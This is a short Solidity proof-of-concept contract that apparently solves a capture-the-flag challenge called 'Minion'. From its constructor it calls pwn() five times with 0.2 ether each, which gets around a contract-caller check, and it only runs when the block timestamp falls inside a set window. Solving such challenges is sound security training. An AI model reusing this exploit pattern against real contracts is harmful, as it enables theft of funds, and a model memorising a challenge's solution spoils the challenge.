// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "./Minion.sol";

contract POCMinion {
    Minion minion;
    bool public sukses;

    constructor(address _minion) payable {
        minion = Minion(_minion);
        require(block.timestamp % 120 >= 0 && block.timestamp % 120 < 60, "Not the right time");
        minion.pwn{value: 0.2 ether}();
        minion.pwn{value: 0.2 ether}();
        minion.pwn{value: 0.2 ether}();
        minion.pwn{value: 0.2 ether}();
        minion.pwn{value: 0.2 ether}();
        sukses = minion.verify(address(this));
    }
}
